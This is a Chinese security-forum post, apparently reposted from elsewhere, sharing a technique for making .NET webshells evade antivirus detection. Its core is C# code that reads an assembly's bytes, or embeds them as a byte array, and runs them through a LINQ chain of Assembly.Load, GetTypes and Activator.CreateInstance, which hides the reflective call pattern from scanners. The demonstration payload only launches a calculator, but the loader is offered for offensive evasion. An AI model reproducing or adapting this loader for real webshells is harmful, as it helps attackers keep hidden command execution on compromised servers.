---
title: 分享一篇不错的.NET Webshell免杀文章
url: https://forum.90sec.com/t/topic/2284
source: 90Sec - 最新话题
date: 2023-08-04
fetch_date: 2025-10-04T11:58:39.896748
---

# 分享一篇不错的.NET Webshell免杀文章

[90Sec](/)

# [分享一篇不错的.NET Webshell免杀文章](/t/topic/2284)

[账号审核](/c/account/11)

[Smile2](https://forum.90sec.com/u/Smile2)

2023 年8 月 3 日 10:47

1

# **.NET ByPass系列 Shell加载字节码**

原文出自这里

![image](https://forum.90sec.com/uploads/default/original/2X/5/599da88f4d3829521e7c233cd5834e1c1dbfd7a4.png)

笔者加载位于当前执行程序所在目录下的 "net-calc.dll" 文件的字节码内容，内容很简单启动一个新进程弹出计算器,并将其存储在 assemblyBytes变量，代码如下

byte[] assemblyBytes = File.ReadAllBytes(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "net-calc.dll"));

List<byte[]> data = new List<byte[]>();

data.Add(this.assemblyBytes);

var e1 = data.Select(Assembly.Load);

Func<Assembly, IEnumerable> map\_type = (Func<Assembly, IEnumerable>)Delegate.CreateDelegate(typeof(Func<Assembly, IEnumerable>), typeof(Assembly).GetMethod("GetTypes"));

var e2 = e1.SelectMany(map\_type);

var e3 = e2.Select(Activator.CreateInstance).ToList();

然后使用LINQ-SelectMany操作符合并两个序列后产生一个新的序列结果，通过LINQ这个能力可以联合Aseembly.Load和Aseembly::GetTypes，再借用LINQ-Select操作符投影Activator.CreateInstance反射创建一个Aseembly对象，这样就可以实现命令执行

![|553x287](file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml17460\wps2.jpg)

实际场景下这种加载外部文件的方式不太友好，我们知道Assembly.Load有多个重载方法，其中有一个重载支持byte[]类型的参数，如此我们可以通过System.IO.File.ReadAllBytes方法读取文件字节码

byte[] assemblyBytes = {0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00, 0xB8 .......... }

运行时如下图

![|553x412](file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml17460\wps3.jpg)

不能上传附件，工具无法传上来

* [首页](/)
* [类别](/categories)
* [准则](/guidelines)
* [服务条款](/tos)
* [隐私政策](/privacy)

由 [Discourse](https://www.discourse.org) 提供技术支持，启用 JavaScript 以获得最佳体验